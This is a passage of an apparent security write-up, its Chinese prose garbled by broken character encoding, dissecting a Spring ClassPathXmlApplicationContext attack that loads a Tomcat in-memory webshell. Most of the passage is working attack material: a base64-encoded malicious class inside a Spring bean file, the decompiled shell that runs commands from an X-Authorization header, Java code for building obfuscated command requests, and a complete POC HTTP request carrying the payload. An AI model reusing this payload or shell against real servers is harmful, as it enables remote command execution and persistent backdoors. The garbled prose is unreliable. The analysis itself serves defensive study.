sYXNzOwwAXwBgCgBeAGEKABsALwEACnByb2Nlc3NvcnMIAGQBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBmAQAEc2l6ZQEAAygpSQwAaABpCgBnAGoBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAEgAbAoAZwBtAQADcmVxCABvAQAHZ2V0Tm90ZQgAcQEAEWphdmEvbGFuZy9JbnRlZ2VyBwBzAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DAB1AHYJAHQAdwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DAB5AHoKAHQAewEACWdldEhlYWRlcggAfQEACWdldE1ldGhvZAwAfwAfCgAbAIAMAA4ADwoAAgCCAQALZ2V0UmVzcG9uc2UIAIQBAAlnZXRXcml0ZXIIAIYBAA5qYXZhL2lvL1dyaXRlcgcAiAEABmhhbmRsZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACKAIsKAAIAjAEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDACOAI8KAIkAkAEABWZsdXNoDACSAAYKAIkAkwEABWNsb3NlDACVAAYKAIkAlgEABGV4ZWMBAAdvcy5uYW1lCACZAQAQamF2YS9sYW5nL1N5c3RlbQcAmwEAC2dldFByb3BlcnR5DACdAIsKAJwAngEAC3RvTG93ZXJDYXNlDACgAA8KADQAoQEAA3dpbggAowEABy9iaW4vc2gIAKUBAAItYwgApwEAB2NtZC5leGUIAKkBAAIvYwgAqwEAEWphdmEvbGFuZy9SdW50aW1lBwCtAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwArwCwCgCuALEBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DACYALMKAK4AtAEAEWphdmEvbGFuZy9Qcm9jZXNzBwC2AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAuAC5CgC3ALoBABFqYXZhL3V0aWwvU2Nhbm5lcgcAvAEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwABQC+CgC9AL8BAAJcYQgAwQEADHVzZURlbGl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</value>

            </list>

        </property>

    </bean>

    <bean id="classLoader" class="javax.management.loading.MLet"/>
    <bean id="clazz" factory-bean="classLoader" factory-method="defineClass">
        <constructor-arg ref="decoder"/>
        <constructor-arg type="int" value="0"/>
        <constructor-arg type="int" value="5119"/>
    </bean>

    <bean factory-bean="clazz" factory-method="newInstance"/>
</beans>
--4ad051cf61a54e2a9831a1e30b9dcc31--
```

------

##### 2.2.2 payloadËß£Êûê

‚Äã		‰æùÊóßÂØπbase64ËøõË°åËß£ÊûêÔºåÂÖ•Âè£ `run` ÊñπÊ≥ï‰∏≠ÔºåÂâçÈù¢‰∏ÄÊÆµ‰ª£Á†ÅÊ∂âÂèäÂà∞ tomcat ÂÜÖÂ≠òÈ©¨Ôºå ‰ªé `var10.write(handle(var8));` ÂºÄÂßãÔºåÂØπËØ∑Ê±ÇÂ§¥ `X-Authorization` ÁöÑÂÄºËøõË°åÂ§ÑÁêÜÂπ∂ÊâßË°åÂæóÂà∞ÂõûÊòæÁªìÊûú„ÄÇ

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package org.apache.shiro.coyote.ser.std;

import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Scanner;

public class StringSerializer79c1cc1083a6415e8b3187ac33179169 {
    public StringSerializer79c1cc1083a6415e8b3187ac33179169() throws Exception {
        this.run();
    }

    private String getReqHeaderName() {
        return "X-Authorization";
    }

    private void run() {
        try {
            Method var1 = Thread.class.getDeclaredMethod("getThreads", new Class[0]);
            var1.setAccessible(true);
            Thread[] var2 = (Thread[])var1.invoke((Object)null);

            for(int var3 = 0; var3 < var2.length; ++var3) {
                if (var2[var3].getName().contains("http") && var2[var3].getName().contains("Acceptor")) {
                    Field var4 = var2[var3].getClass().getDeclaredField("target");
                    var4.setAccessible(true);
                    Object var5 = var4.get(var2[var3]);

                    try {
                        var4 = var5.getClass().getDeclaredField("endpoint");
                    } catch (NoSuchFieldException var14) {
                        var4 = var5.getClass().getDeclaredField("this$0");
                    }

                    var4.setAccessible(true);
                    var5 = var4.get(var5);

                    try {
                        var4 = var5.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException var13) {
                        try {
                            var4 = var5.getClass().getSuperclass().getDeclaredField("handler");
                        } catch (NoSuchFieldException var12) {
                            var4 = var5.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                        }
                    }

                    var4.setAccessible(true);
                    var5 = var4.get(var5);

                    try {
                        var4 = var5.getClass().getDeclaredField("global");
                    } catch (NoSuchFieldException var11) {
                        var4 = var5.getClass().getSuperclass().getDeclaredField("global");
                    }

                    var4.setAccessible(true);
                    var5 = var4.get(var5);
                    var5.getClass().getClassLoader().loadClass("org.apache.coyote.RequestGroupInfo");
                    if (var5.getClass().getName().contains("org.apache.coyote.RequestGroupInfo")) {
                        var4 = var5.getClass().getDeclaredField("processors");
                        var4.setAccessible(true);
                        ArrayList var6 = (ArrayList)var4.get(var5);

                        for(int var7 = 0; var7 < var6.size(); ++var7) {
                            var4 = var6.get(var7).getClass().getDeclaredField("req");
                            var4.setAccessible(true);
                            var5 = var4.get(var6.get(var7)).getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(var4.get(var6.get(var7)), 1);

                            try {
                                String var8 = (String)var4.get(var6.get(var7)).getClass().getMethod("getHeader", String.class).invoke(var4.get(var6.get(var7)), this.getReqHeaderName());
                                if (var8 != null) {
                                    Object var9 = var5.getClass().getDeclaredMethod("getResponse").invoke(var5);
                                    Writer var10 = (Writer)var9.getClass().getMethod("getWriter").invoke(var9);
                                    var10.write(handle(var8));
                                    var10.flush();
                                    var10.close();
                                    break;
                                }
                            } catch (Exception var15) {
                            }
                        }
                    }
                }
            }
        } catch (Throwable var16) {
        }

    }

    private static String exec(String var0) {
        try {
            boolean var1 = true;
            String var2 = System.getProperty("os.name");
            if (var2 != null && var2.toLowerCase().contains("win")) {
                var1 = false;
            }

            String[] var3 = var1 ? new String[]{"/bin/sh", "-c", var0} : new String[]{"cmd.exe", "/c", var0};
            InputStream var4 = Runtime.getRuntime().exec(var3).getInputStream();
            Scanner var5 = (new Scanner(var4)).useDelimiter("\\a");

            String var6;
            for(var6 = ""; var5.hasNext(); var6 = var6 + var5.next()) {
            }

            return var6;
        } catch (Exception var7) {
            return var7.getMessage();
        }
    }

    private static String handle(String var0) throws Exception {
        String var1 = "eyJeXA";
        Object var2 = null;
        if (!var0.startsWith(var1)) {
            return exec(var0);
        } else {
            int var3 = Integer.parseInt(String.valueOf(var0.charAt(var1.length())));
            int var4 = 0;

            for(int var5 = 0; var5 < var3; ++var5) {
                var4 += var0.charAt(var1.length() + 1 + var5);
            }

            String var6 = new String(x(base64Decode(var0.substring(var1.length() + 1 + var3 + var4, var0.indexOf(".")))));
            return "/9j/4A" + base64Encode(x(exec(var6).getBytes())) + "/9k==";
        }
    }

    private static byte[] base64Decode(String var0) throws Exception {
        try {
            Class var1 = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])var1.getMethod("decodeBuffer", String.class).invoke(var1.newInstance(), var0);
        } catch (Exception var4) {
            Class var2 = Class.forName("java.util.Base64");
            Object var3 = var2.getMethod("getDecoder").invoke((Object)null);
            return (byte[])var3.getClass().getMethod("decode", String.class).invoke(var3, var0);
        }
    }

    public static String base64Encode(byte[] var0) throws Exception {
        Object var1 = null;

        try {
            Class var7 = Class.forName("java.util.Base64");
            Object var3 = var7.getMethod("getEncoder", (Class[])null).invoke(var7, (Object[])null);
            var6 = (String)var3.getClass().getMethod("encodeToString", byte[].class).invoke(var3, var0);
        } catch (Exception var5) {
            Class var2 = Class.forName("sun.misc.BASE64Encoder");
            Object var4 = var2.newInstance();
            var6 = (String)var4.getClass().getMethod("encode", byte[].class).invoke(var4, var0);
        }

        return var6;
    }

    public static byte[] x(byte[] var0) {
        byte[] var1 = "???????????????".getBytes();
        byte[] var2 = new byte[var0.length];

        for(int var3 = 0; var3 < var0.length; ++var3) {
            var2[var3] = (byte)(var0[var3] ^ var1[var3 % var1.length]);
        }

        return var2;
    }

    static {
        try {
            new StringSerializer79c1cc1083a6415e8b3187ac33179169();
        } catch (Exception var1) {
        }

    }
}
```

------

##### 2.2.3 handle()ÊñπÊ≥ï

###### 		2.2.3.1 exec()

‚Äã		handleÊñπÊ≥ïÂºÄÂßãËøõË°åifÂà§Êñ≠ÔºåÂ¶ÇÊûúÂØπËæìÂÖ•ÁöÑÂÄº‰∏ç‰∏∫ eyJeXA ÔºåÁõ¥Êé•ËøîÂõû `exec()`  ,execÊñπÊ≥ï‰∏≠È¶ñÂÖà‰πüÊòØÂà§Êñ≠Á≥ªÁªüÔºåÊé•ÁùÄ `useDelimiter("\\A")` Â∞ÜËøîÂõûÁöÑÂÜÖÂÆπÂΩì‰Ωú‰∏Ä‰∏™Êï¥‰ΩìÔºåÁÑ∂ÂêéforÂæ™ÁéØ  (Scanner.hasNext()Âà§Êñ≠ÊµÅÊòØÂê¶ÊúâÂÜÖÂÆπÔºåËøîÂõûÁªìÊûúture„ÄÅfalseÔºåScanner.next()ËØªÂèñÊµÅÂÜÖÂÆπ)  ÂÜôÂÖ•var6ÊúÄÂêéreturnËøîÂõûÔºåÂà∞ËøôÁªìÊùü„ÄÇÂ∏ñÂ≠êÂéüÊñáÂ∞±ÊòØ `dir/a`

```java
private static String exec(String var0) {
    try {
        boolean var1 = true;
        String var2 = System.getProperty("os.name");
        if (var2 != null && var2.toLowerCase().contains("win")) {
            var1 = false;
        }

        String[] var3 = var1 ? new String[]{"/bin/sh", "-c", var0} : new String[]{"cmd.exe", "/c", var0};
        InputStream var4 = Runtime.getRuntime().exec(var3).getInputStream();
        Scanner var5 = (new Scanner(var4)).useDelimiter("\\a");

        String var6;
        for(var6 = ""; var5.hasNext(); var6 = var6 + var5.next()) {
        }

        return var6;
    } catch (Exception var7) {
        return var7.getMessage();
    }
}

private static String handle(String var0) throws Exception {
    String var1 = "eyJeXA";
    Object var2 = null;
    if (!var0.startsWith(var1)) {
        return exec(var0);
    } else {
        int var3 = Integer.parseInt(String.valueOf(var0.charAt(var1.length())));
        int var4 = 0;

        for(int var5 = 0; var5 < var3; ++var5) {
            var4 += var0.charAt(var1.length() + 1 + var5);
        }

        String var6 = new String(x(base64Decode(var0.substring(var1.length() + 1 + var3 + var4, var0.indexOf(".")))));
        return "/9j/4A" + base64Encode(x(exec(var6).getBytes())) + "/9k==";
    }
}
```

------

###### 		2.2.3.2 x()

> ÂØπ‰∫éËØ∑Ê±Ç‰ª•ÂèäËøîÂõûÈÉΩËøõË°åÂä†ÂØÜÂ§ÑÁêÜ

‚Äã		Â¶ÇÊûúÂ≠òÂú® `eyJeXA` Ôºå ÈÇ£Â∞±ËøõË°åÂ¶Ç‰∏ãÂà§Êñ≠ÔºåÂÅáÂ¶Ç‰∏Ä‰∏™ÂÄºÊòØËøôÊ†∑ `eyJeXA3ABC`

- ‚Äã	`var3` ÁöÑÂÄºËé∑ÂæóÁöÑÊòØ `eyJeXA3ABC`  ‰∏≠ÁöÑ 3Ôºå‰ª£Ë°®ÁöÑÊòØÂêéÈù¢ÁöÑ‰∏â‰ΩçÂÄºÔºåÂΩìÁÑ∂Â¶ÇÊûúÊòØ ABCDÂ∞±ÊòØ4
- ‚Äã    `var4` ÂæóÂà∞ÁöÑÊòØABCÁöÑUTF-16ÁöÑÂÄºÁöÑÂíåÔºàËøô‰∏ÄÊÆµÊòØ‰∏∫‰∫ÜÁ°ÆÂÆöÊ∑∑Ê∑ÜÂ≠óÁ¨¶ÁöÑÊï∞ÈáèÔºâ
- ‚Äã    `var6` ÁöÑÂÄºÁúãËµ∑Êù•Âæà‰π±ÔºåËøô‰∏ÄÊÆµ `x(base64Decode(var0.substring(var1.length() + 1 + var3 + var4, var0.indexOf("."))))` ‰ªñÂ§ßÊ¶ÇÁöÑÊÑèÊÄùÊòØÔºå var1ÁöÑÈïøÂ∫¶ + 1 + var3 + var4 , ÁÑ∂Âêé‰ªñ‰ª¨‰πãÂíåÁöÑÂÄºÁöÑ‰ΩçÁΩÆÂºÄÂßãÂØªÊâæÁ¨¨‰∏Ä‰∏™ `.` Âá∫Áé∞ÁöÑ‰ΩçÁΩÆÁÑ∂ÂêéÂèñ‰∏≠Èó¥ÁöÑÂÄº„ÄÇ Âú®ÈÄöËøábase64DecodeËß£Á†ÅÔºå`x()` ÂºÇÊàñÂæóÂà∞ÊúÄÂêéÁöÑÁªìÊûú„ÄÇ

  ```java
  var1.length() + 1 + var3 + var4
  = 6 + 1 + 3 + 198
  = 208
  ```
- returnËøîÂõûÁöÑÁªìÊûúÂ∞±ÊòØÂ∞ÜÊâßË°åÂëΩ‰ª§ÁöÑÁªìÊûúÂÖà `x()` ÂºÇÊàñÂú® base64ÁºñÁ†Å	



------

##### 2.2.4 ÂêéÁª≠Âà©Áî®ÊñπÂºè

‚Äã	ÈÄöËøáÂ¶Ç‰∏äÂèØ‰ª•Ëá™Â∑±ÊûÑÈÄ†Âä†ÂØÜËØ∑Ê±Ç

```java
public static void main(String[] args) throws Exception {

    char ch = 'A' + 'B' + 'C';
    System.out.println((int) ch);

    SecureRandom random = new SecureRandom();
    StringBuilder sb = new StringBuilder(198);
    for (int i = 0; i < (int) ch; i++) {
        char base = random.nextBoolean() ? 'A' : 'a';
        char c = (char) (base + random.nextInt(26));
        sb.append(c);
    }

    String var1 = "eyJeXA";
    String var2 = "3";
    String var3 = "ABC";
    String var4  = sb.toString();
    String var5 = ".";

    String s = "dir/a";

    byte[] x = x(s.getBytes());
    String var6 = base64Encode(x);


    StringBuilder result = new StringBuilder();
    result.append(var1);
    result.append(var2);
    result.append(var3);
    result.append(var4);
    result.append(var6);
    result.append(var5);
    System.out.println("result => " + result);

    String handle = handle(String.valueOf(result));
    System.out.println("handle => " + handle);

}

private static String handle(String var0) throws Exception {
    String var1 = "eyJeXA";

    int var3 = Integer.parseInt(String.valueOf(var0.charAt(var1.length())));
    System.out.println("var3 => " + var3);
    int var4 = 0;

    for(int var5 = 0; var5 < var3; ++var5) {
        var4 += var0.charAt(var1.length() + 1 + var5);
        System.out.println("var4 => " + var4);
    }

    String var6 = var0.substring(var1.length() + 1 + var3 + var4, var0.indexOf("."));
    return var6;

}

public static byte[] x(byte[] var0) {
    byte[] var1 = "???????????????".getBytes();
    byte[] var2 = new byte[var0.length];

    for(int var3 = 0; var3 < var0.length; ++var3) {
        var2[var3] = (byte)(var0[var3] ^ var1[var3 % var1.length]);
    }

    return var2;
}

private static byte[] base64Decode(String var0) throws Exception {
    try {
        Class var1 = Class.forName("sun.misc.BASE64Decoder");
        return (byte[])var1.getMethod("decodeBuffer", String.class).invoke(var1.newInstance(), var0);
    } catch (Exception var4) {
        Class var2 = Class.forName("java.util.Base64");
        Object var3 = var2.getMethod("getDecoder").invoke((Object)null);
        return (byte[])var3.getClass().getMethod("decode", String.class).invoke(var3, var0);
    }
}

public static String base64Encode(byte[] var0) throws Exception {
    Object var1 = null;

    String var6;
    try {
        Class var7 = Class.forName("java.util.Base64");
        Object var3 = var7.getMethod("getEncoder", (Class[])null).invoke(var7, (Object[])null);
        var6 = (String)var3.getClass().getMethod("encodeToString", byte[].class).invoke(var3, var0);
    } catch (Exception var5) {
        Class var2 = Class.forName("sun.misc.BASE64Encoder");
        Object var4 = var2.newInstance();
        var6 = (String)var4.getClass().getMethod("encode", byte[].class).invoke(var4, var0);
    }

    return var6;
}
```

![image-20251204170736240](./assets/image-20251204170736240.png)

------

###### 2.2.4.1 POC

```http
POST /index?name=org.springframework.context.support.ClassPathXmlApplicationContext&org=file:/%24%7bcatalina.home%7d/**/*.tmp HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=4ad051cf61a54e2a9831a1e30b9dcc31
Content-Length: 7983
X-Authorization: eyJeXA3ABCZhkGgkGwZwVjJzBEJbaCNGTzkKzAHjDoQSVUNNjpDrrSTFINYBpxXjTFJVxNlSVyhGwXRCMlgMyMYGTkMZNbxqHnSGZiHyNQLxtvUhotkskDcWbSDvEsontwbbIykExQJwVKHRJUNaMuXctORGVWPwscLUccpwpxAWfdrGkCOwsyuYpffKpGaTaWWpZAttQRkrgmvLW1ZNEF4=.

--4ad051cf61a54e2a9831a1e30b9dcc31
Content-Disposition: form-data; name="field1"

<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                           http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="decoder" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="staticMethod" value="javax.xml.bind.DatatypeConverter.parseBase64Binary"/>
        <property name="arguments">
            <list>
                <value>yv66vgAAADIBOwEAUG9yZy9hcGFjaGUvc2hpcm8vY295b3RlL3Nlci9zdGQvU3RyaW5nU2VyaWFsaXplcjc5YzFjYzEwODNhNjQxNWU4YjMxODdhYzMzMTc5MTY5BwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAcMAAUABgoABAAJAQADcnVuDAALAAYKAAIADAEAEGdldFJlcUhlYWRlck5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAD1gtQXV0aG9yaXphdGlvbggAEAEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcAEgEAE2phdmEvbGFuZy9UaHJvd2FibGUHABQBABBqYXZhL2xhbmcvVGhyZWFkBwAWAQAKZ2V0VGhyZWFkcwgAGAEAD2phdmEvbGFuZy9DbGFzcwcAGgEAEltMamF2YS9sYW5nL0NsYXNzOwcAHAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAHgAfCgAbACABABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACIBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAJAAlCgAjACYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACgAKQoAIwAqAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcALAEAB2dldE5hbWUMAC4ADwoAFwAvAQAEaHR0cAgAMQEAEGphdmEvbGFuZy9TdHJpbmcHADMBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwANQA2CgA0ADcBAAhBY2NlcHRvcggAOQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAOwA8CgAEAD0BAAZ0YXJnZXQIAD8BABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABBAEIKABsAQwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwBFCgBGACYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwASABJCgBGAEoBAAhlbmRwb2ludAgATAEABnRoaXMkMAgATgEAB2hhbmRsZXIIAFABAA1nZXRTdXBlcmNsYXNzDABSADwKABsAUwEABmdsb2JhbAgAVQEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAVwBYCgAbAFkBACJvcmcuYXBhY2hlLmNveW90ZS5SZXF1ZXN0R3JvdXBJbmZvCABbAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwBdAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAXwBgCgBeAGEKABsALwEACnByb2Nlc3NvcnMIAGQBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBmAQAEc2l6ZQEAAygpSQwAaABpCgBnAGoBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAEgAbAoAZwBtAQADcmVxCABvAQAHZ2V0Tm90ZQgAcQEAEWphdmEvbGFuZy9JbnRlZ2VyBwBzAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DAB1AHYJAHQAdwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DAB5AHoKAHQAewEACWdldEhlYWRlcggAfQEACWdldE1ldGhvZAwAfwAfCgAbAIAMAA4ADwoAAgCCAQALZ2V0UmVzcG9uc2UIAIQBAAlnZXRXcml0ZXIIAIYBAA5qYXZhL2lvL1dyaXRlcgcAiAEABmhhbmRsZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACKAIsKAAIAjAEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDACOAI8KAIkAkAEABWZsdXNoDACSAAYKAIkAkwEABWNsb3NlDACVAAYKAIkAlgEABGV4ZWMBAAdvcy5uYW1lCACZAQAQamF2YS9sYW5nL1N5c3RlbQcAmwEAC2dldFByb3BlcnR5DACdAIsKAJwAngEAC3RvTG93ZXJDYXNlDACgAA8KADQAoQEAA3dpbggAowEABy9iaW4vc2gIAKUBAAItYwgApwEAB2NtZC5leGUIAKkBAAIvYwgAqwEAEWphdmEvbGFuZy9SdW50aW1lBwCtAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwArwCwCgCuALEBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DACYALMKAK4AtAEAEWphdmEvbGFuZy9Qcm9jZXNzBwC2AQAO